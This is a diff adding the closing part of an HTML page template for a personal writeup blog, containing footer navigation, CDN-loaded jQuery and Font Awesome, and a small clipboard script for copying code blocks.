+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    Panosoiko
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writeups</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     --><!--
+       --><li><a href="/tags/">Tags</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/PanosoikoGr">Projects</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
